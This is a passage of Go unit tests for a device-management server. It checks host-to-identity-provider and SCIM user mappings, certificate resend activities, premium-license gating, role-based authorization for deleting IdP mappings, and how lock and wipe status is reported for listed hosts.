		ds.ScimUserByUserNameOrEmailFunc = func(ctx context.Context, userName, email string) (*automdm.ScimUser, error) {
			return &automdm.ScimUser{ID: 1, UserName: "user@example.com"}, nil
		}
		// both the new IdP username and the SCIM link resend certificate 10
		ds.SetOrUpdateHostSCIMUserMappingFunc = func(ctx context.Context, hostID uint, scimUserID uint) ([]automdm.ActivityTypeResentCertificate, error) {
			return []automdm.ActivityTypeResentCertificate{
				{HostID: hostID, CertificateTemplateID: 10},
				{HostID: hostID, CertificateTemplateID: 20},
			}, nil
		}
		ds.SetOrUpdateIDPHostDeviceMappingFunc = func(ctx context.Context, hostID uint, email string) ([]automdm.ActivityTypeResentCertificate, error) {
			return []automdm.ActivityTypeResentCertificate{{HostID: hostID, CertificateTemplateID: 10}}, nil
		}
		ds.ListHostDeviceMappingFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostDeviceMapping, error) {
			return []*automdm.HostDeviceMapping{{HostID: hostID, Email: "user@example.com", Source: automdm.DeviceMappingMDMIdpAccounts}}, nil
		}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{}, nil
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		result, err := svc.SetHostDeviceMapping(userCtx, 1, "user@example.com", automdm.DeviceMappingIDP)
		require.NoError(t, err)
		require.True(t, ds.SetOrUpdateIDPHostDeviceMappingFuncInvoked)
		require.True(t, ds.SetOrUpdateHostSCIMUserMappingFuncInvoked) // Should be called since SCIM user exists
		require.Equal(t, []uint{10, 20}, resentCerts)
		require.NotNil(t, result)
		require.Len(t, result, 1)
		assert.Equal(t, uint(1), result[0].HostID)
		assert.Equal(t, "user@example.com", result[0].Email)
		assert.Equal(t, automdm.DeviceMappingMDMIdpAccounts, result[0].Source)
	})

	t.Run("IDP source logs resent certificates when the edited activity fails", func(t *testing.T) {
		ds := new(mock.Store)
		opts := &TestServerOpts{License: &automdm.LicenseInfo{Tier: automdm.TierPremium}}
		svc, ctx := newTestService(t, ds, nil, nil, opts)

		var resentCerts []uint
		opts.ActivityMock.NewActivityFunc = func(_ context.Context, _ *activity_api.User, act activity_api.ActivityDetails) error {
			if cert, ok := act.(automdm.ActivityTypeResentCertificate); ok {
				resentCerts = append(resentCerts, cert.CertificateTemplateID)
				return nil
			}
			return errors.New("activity failed")
		}

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1, UUID: "host-uuid-1"}, nil
		}
		ds.GetHostEmailsFunc = func(ctx context.Context, hostUUID string, source string) ([]string, error) {
			return nil, nil
		}
		ds.ScimUserByUserNameOrEmailFunc = func(ctx context.Context, userName, email string) (*automdm.ScimUser, error) {
			return nil, sql.ErrNoRows
		}
		ds.SetOrUpdateIDPHostDeviceMappingFunc = func(ctx context.Context, hostID uint, email string) ([]automdm.ActivityTypeResentCertificate, error) {
			return []automdm.ActivityTypeResentCertificate{{HostID: hostID, CertificateTemplateID: 10}}, nil
		}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{}, nil
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		_, err := svc.SetHostDeviceMapping(userCtx, 1, "user@example.com", automdm.DeviceMappingIDP)
		require.ErrorContains(t, err, "create updated host idp activity")
		require.Equal(t, []uint{10}, resentCerts)
	})

	t.Run("IDP source success with any username when SCIM user not found", func(t *testing.T) {
		ds := new(mock.Store)
		svc, ctx := newTestService(t, ds, nil, nil, &TestServerOpts{License: &automdm.LicenseInfo{Tier: automdm.TierPremium}})

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1, UUID: "host-uuid-1"}, nil
		}
		ds.GetHostEmailsFunc = func(ctx context.Context, hostUUID string, source string) ([]string, error) {
			return nil, nil // No existing IDP email
		}
		ds.ScimUserByUserNameOrEmailFunc = func(ctx context.Context, userName, email string) (*automdm.ScimUser, error) {
			return nil, sql.ErrNoRows // SCIM user not found
		}
		ds.SetOrUpdateIDPHostDeviceMappingFunc = func(ctx context.Context, hostID uint, email string) ([]automdm.ActivityTypeResentCertificate, error) {
			return nil, nil
		}
		ds.DeleteHostSCIMUserMappingFunc = func(ctx context.Context, hostID uint) ([]automdm.ActivityTypeResentCertificate, error) {
			return nil, nil
		}
		ds.ListHostDeviceMappingFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostDeviceMapping, error) {
			return []*automdm.HostDeviceMapping{{HostID: hostID, Email: "any@username.com", Source: automdm.DeviceMappingMDMIdpAccounts}}, nil
		}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{}, nil
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		result, err := svc.SetHostDeviceMapping(userCtx, 1, "any@username.com", automdm.DeviceMappingIDP)
		require.NoError(t, err)
		require.True(t, ds.SetOrUpdateIDPHostDeviceMappingFuncInvoked)
		require.False(t, ds.SetOrUpdateHostSCIMUserMappingFuncInvoked) // Should NOT be called since SCIM user doesn't exist
		require.True(t, ds.DeleteHostSCIMUserMappingFuncInvoked)       // Should be called to remove any existing SCIM mapping
		require.NotNil(t, result)
		require.Len(t, result, 1)
		assert.Equal(t, uint(1), result[0].HostID)
		assert.Equal(t, "any@username.com", result[0].Email)
		assert.Equal(t, automdm.DeviceMappingMDMIdpAccounts, result[0].Source)
	})

	t.Run("IDP source same email skips email update but still reconciles SCIM mapping", func(t *testing.T) {
		ds := new(mock.Store)
		svc, ctx := newTestService(t, ds, nil, nil, &TestServerOpts{License: &automdm.LicenseInfo{Tier: automdm.TierPremium}})

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1, UUID: "host-uuid-1"}, nil
		}
		ds.GetHostEmailsFunc = func(ctx context.Context, hostUUID string, source string) ([]string, error) {
			return []string{"user@example.com"}, nil
		}
		ds.ListHostDeviceMappingFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostDeviceMapping, error) {
			return []*automdm.HostDeviceMapping{{HostID: hostID, Email: "user@example.com", Source: automdm.DeviceMappingIDP}}, nil
		}
		ds.ScimUserByUserNameOrEmailFunc = func(ctx context.Context, userName, email string) (*automdm.ScimUser, error) {
			return &automdm.ScimUser{ID: 2, UserName: "user@example.com"}, nil
		}
		ds.SetOrUpdateHostSCIMUserMappingFunc = func(ctx context.Context, hostID uint, scimUserID uint) ([]automdm.ActivityTypeResentCertificate, error) {
			require.Equal(t, uint(1), hostID)
			require.Equal(t, uint(2), scimUserID)
			return nil, nil
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		result, err := svc.SetHostDeviceMapping(userCtx, 1, "user@example.com", automdm.DeviceMappingIDP)
		require.NoError(t, err)
		require.NotNil(t, result)
		require.Len(t, result, 1)
		assert.Equal(t, "user@example.com", result[0].Email)

		// Email update should NOT be invoked because the email hasn't changed
		require.False(t, ds.SetOrUpdateIDPHostDeviceMappingFuncInvoked)
		// But SCIM mapping SHOULD still be reconciled (fixes #46624)
		require.True(t, ds.ScimUserByUserNameOrEmailFuncInvoked)
		require.True(t, ds.SetOrUpdateHostSCIMUserMappingFuncInvoked)
	})

	t.Run("IDP source different email proceeds with update", func(t *testing.T) {
		ds := new(mock.Store)
		svc, ctx := newTestService(t, ds, nil, nil, &TestServerOpts{License: &automdm.LicenseInfo{Tier: automdm.TierPremium}})

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1, UUID: "host-uuid-1"}, nil
		}
		ds.GetHostEmailsFunc = func(ctx context.Context, hostUUID string, source string) ([]string, error) {
			return []string{"old@example.com"}, nil
		}
		ds.ListHostDeviceMappingFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostDeviceMapping, error) {
			return []*automdm.HostDeviceMapping{{HostID: hostID, Email: "new@example.com", Source: automdm.DeviceMappingIDP}}, nil
		}
		ds.SetOrUpdateIDPHostDeviceMappingFunc = func(ctx context.Context, hostID uint, email string) ([]automdm.ActivityTypeResentCertificate, error) {
			return nil, nil
		}
		ds.ScimUserByUserNameOrEmailFunc = func(ctx context.Context, userName, email string) (*automdm.ScimUser, error) {
			return &automdm.ScimUser{ID: 1, UserName: "new@example.com"}, nil
		}
		ds.SetOrUpdateHostSCIMUserMappingFunc = func(ctx context.Context, hostID uint, scimUserID uint) ([]automdm.ActivityTypeResentCertificate, error) {
			return nil, nil
		}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{}, nil
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		result, err := svc.SetHostDeviceMapping(userCtx, 1, "new@example.com", automdm.DeviceMappingIDP)
		require.NoError(t, err)
		require.NotNil(t, result)

		// These SHOULD be invoked because the email changed
		require.True(t, ds.SetOrUpdateIDPHostDeviceMappingFuncInvoked)
		require.True(t, ds.SetOrUpdateHostSCIMUserMappingFuncInvoked)
	})

	t.Run("IDP source no existing email proceeds with update", func(t *testing.T) {
		ds := new(mock.Store)
		svc, ctx := newTestService(t, ds, nil, nil, &TestServerOpts{License: &automdm.LicenseInfo{Tier: automdm.TierPremium}})

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1, UUID: "host-uuid-1"}, nil
		}
		ds.GetHostEmailsFunc = func(ctx context.Context, hostUUID string, source string) ([]string, error) {
			return nil, nil // No existing IDP email
		}
		ds.ListHostDeviceMappingFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostDeviceMapping, error) {
			return []*automdm.HostDeviceMapping{{HostID: hostID, Email: "user@example.com", Source: automdm.DeviceMappingIDP}}, nil
		}
		ds.SetOrUpdateIDPHostDeviceMappingFunc = func(ctx context.Context, hostID uint, email string) ([]automdm.ActivityTypeResentCertificate, error) {
			return nil, nil
		}
		ds.ScimUserByUserNameOrEmailFunc = func(ctx context.Context, userName, email string) (*automdm.ScimUser, error) {
			return &automdm.ScimUser{ID: 1, UserName: "user@example.com"}, nil
		}
		ds.SetOrUpdateHostSCIMUserMappingFunc = func(ctx context.Context, hostID uint, scimUserID uint) ([]automdm.ActivityTypeResentCertificate, error) {
			return nil, nil
		}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{}, nil
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		result, err := svc.SetHostDeviceMapping(userCtx, 1, "user@example.com", automdm.DeviceMappingIDP)
		require.NoError(t, err)
		require.NotNil(t, result)

		// Should proceed with update since there was no existing IDP email
		require.True(t, ds.SetOrUpdateIDPHostDeviceMappingFuncInvoked)
	})

	t.Run("IDP source fails without premium license", func(t *testing.T) {
		ds := new(mock.Store)
		svc, ctx := newTestService(t, ds, nil, nil, &TestServerOpts{License: &automdm.LicenseInfo{Tier: automdm.TierFree}})

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1}, nil
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		_, err := svc.SetHostDeviceMapping(userCtx, 1, "user@example.com", automdm.DeviceMappingIDP)
		require.Error(t, err)
		assert.Equal(t, automdm.ErrMissingLicense, err)
	})

	t.Run("invalid source returns validation error", func(t *testing.T) {
		ds := new(mock.Store)
		svc, ctx := newTestService(t, ds, nil, nil)

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1}, nil
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		_, err := svc.SetHostDeviceMapping(userCtx, 1, "user@example.com", "invalid")
		require.Error(t, err)
		require.Contains(t, err.Error(), "must be 'custom' or 'idp'")
		require.True(t, ds.HostLiteFuncInvoked) // Authorization was checked
	})

	t.Run("authorization failure for observer user", func(t *testing.T) {
		ds := new(mock.Store)
		svc, ctx := newTestService(t, ds, nil, nil)

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1}, nil
		}

		// Use observer user who shouldn't have write permission
		user := &automdm.User{
			ID:         42,
			Email:      "observer@example.com",
			GlobalRole: new(automdm.RoleObserver),
		}
		userCtx := viewer.NewContext(ctx, viewer.Viewer{User: user})

		_, err := svc.SetHostDeviceMapping(userCtx, 1, "user@example.com", "custom")
		require.Error(t, err)
		require.Contains(t, err.Error(), "forbidden")
	})

	t.Run("host not found returns error", func(t *testing.T) {
		ds := new(mock.Store)
		svc, ctx := newTestService(t, ds, nil, nil)

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return nil, sql.ErrNoRows
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		_, err := svc.SetHostDeviceMapping(userCtx, 999, "user@example.com", "custom")
		require.Error(t, err)
		assert.Contains(t, err.Error(), "get host")
	})

	t.Run("orbit installer source override", func(t *testing.T) {
		ds := new(mock.Store)
		svc, ctx := newTestService(t, ds, nil, nil)

		// Create orbit context that simulates installer authentication
		authzCtx := &authzctx.AuthorizationContext{}
		orbitCtx := authzctx.NewContext(ctx, authzCtx)
		orbitCtx = hostctx.NewContext(orbitCtx, &automdm.Host{ID: 1})
		if ac, ok := authzctx.FromContext(orbitCtx); ok {
			ac.SetAuthnMethod(authzctx.AuthnOrbitToken)
		}

		ds.SetOrUpdateCustomHostDeviceMappingFunc = func(ctx context.Context, hostID uint, email, source string) ([]*automdm.HostDeviceMapping, error) {
			// Should use installer source for orbit token
			require.Equal(t, automdm.DeviceMappingCustomInstaller, source)
			return []*automdm.HostDeviceMapping{{HostID: hostID, Email: email, Source: source}}, nil
		}

		result, err := svc.SetHostDeviceMapping(orbitCtx, 1, "user@example.com", "custom")
		require.NoError(t, err)
		require.True(t, ds.SetOrUpdateCustomHostDeviceMappingFuncInvoked)
		require.NotNil(t, result)
	})
}

func TestDeleteHostDeviceIDPMapping(t *testing.T) {
	t.Run("success by admin on premium", func(t *testing.T) {
		ds := new(mock.Store)
		opts := &TestServerOpts{License: &automdm.LicenseInfo{Tier: automdm.TierPremium}}
		svc, ctx := newTestService(t, ds, nil, nil, opts)

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1}, nil
		}
		ds.DeleteHostIDPFunc = func(ctx context.Context, id uint) error {
			return nil
		}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{}, nil
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		err := svc.DeleteHostIDP(userCtx, 1)
		require.True(t, ds.DeleteHostIDPFuncInvoked)
		require.True(t, opts.ActivityMock.NewActivityFuncInvoked)
		require.NoError(t, err)
	})
	t.Run("failure by admin on free", func(t *testing.T) {
		ds := new(mock.Store)
		opts := &TestServerOpts{License: &automdm.LicenseInfo{Tier: automdm.TierFree}}
		svc, ctx := newTestService(t, ds, nil, nil, opts)

		ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
			return &automdm.Host{ID: 1}, nil
		}
		ds.DeleteHostIDPFunc = func(ctx context.Context, id uint) error {
			return nil
		}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{}, nil
		}

		userCtx := test.UserContext(ctx, test.UserAdmin)
		err := svc.DeleteHostIDP(userCtx, 1)
		// err is license err
		assert.Equal(t, automdm.ErrMissingLicense, err)

		require.False(t, ds.DeleteHostIDPFuncInvoked)
		require.False(t, opts.ActivityMock.NewActivityFuncInvoked)
	})

	t.Run("authorization tests", func(t *testing.T) {
		teamHost := &automdm.Host{ID: 1, TeamID: new(uint(1))}
		globalHost := &automdm.Host{ID: 2}

		ds := new(mock.Store)
		opts := &TestServerOpts{License: &automdm.LicenseInfo{Tier: automdm.TierPremium}}
		svc, ctx := newTestService(t, ds, nil, nil, opts)

		ds.DeleteHostIDPFunc = func(ctx context.Context, id uint) error {
			return nil
		}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{}, nil
		}

		testCases := []struct {
			name       string
			user       *automdm.User
			host       *automdm.Host
			shouldFail bool
		}{
			// Global roles
			{
				name:       "global admin can delete global host IDP",
				user:       test.UserAdmin,
				host:       globalHost,
				shouldFail: false,
			},
			{
				name:       "global admin can delete team host IDP",
				user:       test.UserAdmin,
				host:       teamHost,
				shouldFail: false,
			},
			{
				name:       "global maintainer can delete global host IDP",
				user:       test.UserMaintainer,
				host:       globalHost,
				shouldFail: false,
			},
			{
				name:       "global maintainer can delete team host IDP",
				user:       test.UserMaintainer,
				host:       teamHost,
				shouldFail: false,
			},
			{
				name:       "global observer cannot delete global host IDP",
				user:       test.UserObserver,
				host:       globalHost,
				shouldFail: true,
			},
			{
				name:       "global observer cannot delete team host IDP",
				user:       test.UserObserver,
				host:       teamHost,
				shouldFail: true,
			},
			{
				name:       "global observer plus cannot delete global host IDP",
				user:       test.UserObserverPlus,
				host:       globalHost,
				shouldFail: true,
			},
			{
				name:       "global observer plus cannot delete team host IDP",
				user:       test.UserObserverPlus,
				host:       teamHost,
				shouldFail: true,
			},
			{
				name:       "global gitops cannot delete global host IDP",
				user:       test.UserGitOps,
				host:       globalHost,
				shouldFail: true,
			},
			{
				name:       "global gitops cannot delete team host IDP",
				user:       test.UserGitOps,
				host:       teamHost,
				shouldFail: true,
			},
			// Team roles - correct team
			{
				name:       "team admin can delete team host IDP",
				user:       test.UserTeamAdminTeam1,
				host:       teamHost,
				shouldFail: false,
			},
			{
				name:       "team admin cannot delete global host IDP",
				user:       test.UserTeamAdminTeam1,
				host:       globalHost,
				shouldFail: true,
			},
			{
				name:       "team maintainer can delete team host IDP",
				user:       test.UserTeamMaintainerTeam1,
				host:       teamHost,
				shouldFail: false,
			},
			{
				name:       "team maintainer cannot delete global host IDP",
				user:       test.UserTeamMaintainerTeam1,
				host:       globalHost,
				shouldFail: true,
			},
			{
				name:       "team observer cannot delete team host IDP",
				user:       test.UserTeamObserverTeam1,
				host:       teamHost,
				shouldFail: true,
			},
			{
				name:       "team observer cannot delete global host IDP",
				user:       test.UserTeamObserverTeam1,
				host:       globalHost,
				shouldFail: true,
			},
			{
				name:       "team observer plus cannot delete team host IDP",
				user:       test.UserTeamObserverPlusTeam1,
				host:       teamHost,
				shouldFail: true,
			},
			{
				name:       "team observer plus cannot delete global host IDP",
				user:       test.UserTeamObserverPlusTeam1,
				host:       globalHost,
				shouldFail: true,
			},
			{
				name:       "team gitops cannot delete team host IDP",
				user:       test.UserTeamGitOpsTeam1,
				host:       teamHost,
				shouldFail: true,
			},
			{
				name:       "team gitops cannot delete global host IDP",
				user:       test.UserTeamGitOpsTeam1,
				host:       globalHost,
				shouldFail: true,
			},
			// Team roles - wrong team
			{
				name:       "team admin from different team cannot delete team host IDP",
				user:       test.UserTeamAdminTeam2,
				host:       teamHost,
				shouldFail: true,
			},
			{
				name:       "team maintainer from different team cannot delete team host IDP",
				user:       test.UserTeamMaintainerTeam2,
				host:       teamHost,
				shouldFail: true,
			},
			// No roles
			{
				name:       "user with no roles cannot delete global host IDP",
				user:       test.UserNoRoles,
				host:       globalHost,
				shouldFail: true,
			},
			{
				name:       "user with no roles cannot delete team host IDP",
				user:       test.UserNoRoles,
				host:       teamHost,
				shouldFail: true,
			},
		}

		for _, tc := range testCases {
			// reset ds mock flags
			ds.DeleteHostIDPFuncInvoked = false
			opts.ActivityMock.NewActivityFuncInvoked = false

			// redefine this datastore mock for each test case since its return value is specific per case
			ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
				// this will always be true, since the method is called with tc.host.ID in the first place
				if id == tc.host.ID {
					return tc.host, nil
				}
				return nil, sql.ErrNoRows
			}

			t.Run(tc.name, func(t *testing.T) {
				userCtx := test.UserContext(ctx, tc.user)
				err := svc.DeleteHostIDP(userCtx, tc.host.ID)

				if tc.shouldFail {
					require.Error(t, err)
					require.Contains(t, err.Error(), authz.ForbiddenErrorMessage)
					require.False(t, ds.DeleteHostIDPFuncInvoked)
					require.False(t, opts.ActivityMock.NewActivityFuncInvoked)
				} else {
					require.NoError(t, err)
					require.True(t, ds.DeleteHostIDPFuncInvoked)
					require.True(t, opts.ActivityMock.NewActivityFuncInvoked)
				}
			})
		}
	})
}

func TestListHostsDeviceStatusAndPendingAction(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	// Create test hosts
	host1 := &automdm.Host{
		ID:       1,
		UUID:     "uuid1",
		Hostname: "host1",
		Platform: "darwin",
		MDM:      automdm.MDMHostData{},
	}
	host2 := &automdm.Host{
		ID:       2,
		UUID:     "uuid2",
		Hostname: "host2",
		Platform: "windows",
		MDM:      automdm.MDMHostData{},
	}
	host3 := &automdm.Host{
		ID:       3,
		UUID:     "uuid3",
		Hostname: "host3",
		Platform: "darwin",
		MDM:      automdm.MDMHostData{},
	}
	host4 := &automdm.Host{
		ID:       4,
		UUID:     "uuid4",
		Hostname: "host4-no-mdm",
		Platform: "darwin",
		// No MDM info
	}

	mockHosts := []*automdm.Host{host1, host2, host3, host4}

	ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
		return mockHosts, nil
	}

	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		return nil
	}

	// Test scenarios
	t.Run("no including device status", func(t *testing.T) {
		ds.GetHostsLockWipeStatusBatchFunc = func(ctx context.Context, hosts []*automdm.Host) (map[uint]*automdm.HostLockWipeStatus, error) {
			// Return empty map - no MDM actions for any host
			return make(map[uint]*automdm.HostLockWipeStatus), nil
		}

		userContext := test.UserContext(ctx, test.UserAdmin)
		hosts, err := svc.ListHosts(userContext, automdm.HostListOptions{IncludeDeviceStatus: false})
		require.NoError(t, err)
		require.Len(t, hosts, 4)
		require.False(t, ds.GetHostsLockWipeStatusBatchFuncInvoked)

		// All hosts have no MDM actions (empty statusMap), so device_status and pending_action should be nil
		for _, h := range hosts {
			require.NotNil(t, h.MDM) // MDM is a struct, not a pointer
			require.Nil(t, h.MDM.DeviceStatus)
			require.Nil(t, h.MDM.PendingAction)
		}
	})

	t.Run("no MDM actions", func(t *testing.T) {
		ds.GetHostsLockWipeStatusBatchFunc = func(ctx context.Context, hosts []*automdm.Host) (map[uint]*automdm.HostLockWipeStatus, error) {
			// Return empty map - no MDM actions for any host
			return make(map[uint]*automdm.HostLockWipeStatus), nil
		}

		userContext := test.UserContext(ctx, test.UserAdmin)
		hosts, err := svc.ListHosts(userContext, automdm.HostListOptions{IncludeDeviceStatus: true})
		require.NoError(t, err)
		require.Len(t, hosts, 4)
		require.True(t, ds.GetHostsLockWipeStatusBatchFuncInvoked)

		// All hosts have no MDM actions (empty statusMap), so device_status and pending_action should be mapped to default
		for _, h := range hosts {
			require.NotNil(t, h.MDM) // MDM is a struct, not a pointer
			require.Equal(t, string(automdm.DeviceStatusUnlocked), *h.MDM.DeviceStatus)
			require.Equal(t, string(automdm.PendingActionNone), *h.MDM.PendingAction)
		}
	})

	t.Run("lock pending", func(t *testing.T) {
		ds.GetHostsLockWipeStatusBatchFunc = func(ctx context.Context, hosts []*automdm.Host) (map[uint]*automdm.HostLockWipeStatus, error) {
			statusMap := make(map[uint]*automdm.HostLockWipeStatus)
			// Host 1 has pending lock command
			statusMap[1] = &automdm.HostLockWipeStatus{
				HostAutoMDMPlatform: "darwin",
				LockMDMCommand:      &automdm.MDMCommand{CommandUUID: "lock-cmd-1"},
				// No result yet, so it's pending
			}
			return statusMap, nil
		}

		userContext := test.UserContext(ctx, test.UserAdmin)
		hosts, err := svc.ListHosts(userContext, automdm.HostListOptions{IncludeDeviceStatus: true})
		require.NoError(t, err)
		require.Len(t, hosts, 4)

		// Host 1 should show pending lock
		require.NotNil(t, hosts[0].MDM)
		require.NotNil(t, hosts[0].MDM.DeviceStatus)
		require.NotNil(t, hosts[0].MDM.PendingAction)
		require.Equal(t, string(automdm.PendingActionLock), *hosts[0].MDM.PendingAction)
	})

	t.Run("lock acknowledged", func(t *testing.T) {
		ds.GetHostsLockWipeStatusBatchFunc = func(ctx context.Context, hosts []*automdm.Host) (map[uint]*automdm.HostLockWipeStatus, error) {
			statusMap := make(map[uint]*automdm.HostLockWipeStatus)
			// Host 1 has acknowledged lock command
			statusMap[1] = &automdm.HostLockWipeStatus{
				HostAutoMDMPlatform: "darwin",
				LockMDMCommand:      &automdm.MDMCommand{CommandUUID: "lock-cmd-1"},
				LockMDMCommandResult: &automdm.MDMCommandResult{
					Status: automdm.MDMAppleStatusAcknowledged,
				},
			}
			return statusMap, nil
		}

		userContext := test.UserContext(ctx, test.UserAdmin)
		hosts, err := svc.ListHosts(userContext, automdm.HostListOptions{IncludeDeviceStatus: true})
		require.NoError(t, err)
		require.Len(t, hosts, 4)

		// Host 1 should show locked with NO pending action
		require.NotNil(t, hosts[0].MDM)
		require.NotNil(t, hosts[0].MDM.DeviceStatus)
		require.Equal(t, string(automdm.DeviceStatusLocked), *hosts[0].MDM.DeviceStatus)
		require.NotNil(t, hosts[0].MDM.PendingAction)
		require.Equal(t, string(automdm.PendingActionNone), *hosts[0].MDM.PendingAction)
	})

	t.Run("wipe pending", func(t *testing.T) {
		ds.GetHostsLockWipeStatusBatchFunc = func(ctx context.Context, hosts []*automdm.Host) (map[uint]*automdm.HostLockWipeStatus, error) {
			statusMap := make(map[uint]*automdm.HostLockWipeStatus)
			// Host 2 (Windows) has pending wipe command
			statusMap[2] = &automdm.HostLockWipeStatus{
				HostAutoMDMPlatform: "windows",
				WipeMDMCommand:      &automdm.MDMCommand{CommandUUID: "wipe-cmd-2"},
				// No result yet, so it's pending
			}
			return statusMap, nil
		}

		userContext := test.UserContext(ctx, test.UserAdmin)
		hosts, err := svc.ListHosts(userContext, automdm.HostListOptions{IncludeDeviceStatus: true})
		require.NoError(t, err)
		require.Len(t, hosts, 4)

		// Host 2 should show pending wipe
		require.NotNil(t, hosts[1].MDM)
		require.NotNil(t, hosts[1].MDM.PendingAction)
		require.Equal(t, string(automdm.PendingActionWipe), *hosts[1].MDM.PendingAction)
	})

	t.Run("wipe acknowledged", func(t *testing.T) {
		ds.GetHostsLockWipeStatusBatchFunc = func(ctx context.Context, hosts []*automdm.Host) (map[uint]*automdm.HostLockWipeStatus, error) {
			statusMap := make(map[uint]*automdm.HostLockWipeStatus)
			// Host 2 (Windows) has acknowledged wipe command
			statusMap[2] = &automdm.HostLockWipeStatus{
				HostAutoMDMPlatform: "windows",
				WipeMDMCommand:      &automdm.MDMCommand{CommandUUID: "wipe-cmd-2"},
				WipeMDMCommandResult: &automdm.MDMCommandResult{
					Status: "200", // Windows success status
				},
			}
			return statusMap, nil
		}

		userContext := test.UserContext(ctx, test.UserAdmin)
		hosts, err := svc.ListHosts(userContext, automdm.HostListOptions{IncludeDeviceStatus: true})
		require.NoError(t, err)
		require.Len(t, hosts, 4)

		// Host 2 should show wiped
		require.NotNil(t, hosts[1].MDM)
		require.NotNil(t, hosts[1].MDM.DeviceStatus)
		require.Equal(t, string(automdm.DeviceStatusWiped), *hosts[1].MDM.DeviceStatus)
		require.NotNil(t, hosts[1].MDM.PendingAction)
		require.Equal(t, string(automdm.PendingActionNone), *hosts[1].MDM.PendingAction)
	})

	t.Run("multiple hosts with different states", func(t *testing.T) {
		ds.GetHostsLockWipeStatusBatchFunc = func(ctx context.Context, hosts []*automdm.Host) (map[uint]*automdm.HostLockWipeStatus, error) {
			statusMap := make(map[uint]*automdm.HostLockWipeStatus)

			// Host 1: locked
			statusMap[1] = &automdm.HostLockWipeStatus{
				HostAutoMDMPlatform: "darwin",
				LockMDMCommand:      &automdm.MDMCommand{CommandUUID: "lock-cmd-1"},
				LockMDMCommandResult: &automdm.MDMCommandResult{
					Status: automdm.MDMAppleStatusAcknowledged,
				},
			}

			// Host 2: pending wipe
			statusMap[2] = &automdm.HostLockWipeStatus{
				HostAutoMDMPlatform: "windows",
				WipeMDMCommand:      &automdm.MDMCommand{CommandUUID: "wipe-cmd-2"},
			}

			// Host 3: no actions (unlocked)
			statusMap[3] = &automdm.HostLockWipeStatus{
				HostAutoMDMPlatform: "darwin",
			}

			return statusMap, nil
		}

		userContext := test.UserContext(ctx, test.UserAdmin)
		hosts, err := svc.ListHosts(userContext, automdm.HostListOptions{IncludeDeviceStatus: true})
		require.NoError(t, err)
		require.Len(t, hosts, 4)

		// Host 1: locked
		require.NotNil(t, hosts[0].MDM)
		require.Equal(t, string(automdm.DeviceStatusLocked), *hosts[0].MDM.DeviceStatus)
		require.Equal(t, string(automdm.PendingActionNone), *hosts[0].MDM.PendingAction)

		// Host 2: pending wipe
		require.NotNil(t, hosts[1].MDM)
		require.Equal(t, string(automdm.PendingActionWipe), *hosts[1].MDM.PendingAction)

		// Host 3: unlocked
		require.NotNil(t, hosts[2].MDM)
		require.Equal(t, string(automdm.DeviceStatusUnlocked), *hosts[2].MDM.DeviceStatus)
		require.Equal(t, string(automdm.PendingActionNone), *hosts[2].MDM.PendingAction)
	})

	t.Run("script-based lock (Windows & Linux)", func(t *testing.T) {
		var exitCode0 int64
		var exitCode1 int64 = 1

		ds.GetHostsLockWipeStatusBatchFunc = func(ctx context.Context, hosts []*automdm.Host) (map[uint]*automdm.HostLockWipeStatus, error) {
			statusMap := make(map[uint]*automdm.HostLockWipeStatus)

			// Host 2: Windows with successful lock script
			statusMap[2] = &automdm.HostLockWipeStatus{
				HostAutoMDMPlatform: "windows",
				LockScript: &automdm.HostScriptResult{
					ExecutionID: "script-exec-1",
					ExitCode:    &exitCode0,
				},
			}

			return statusMap, nil
		}

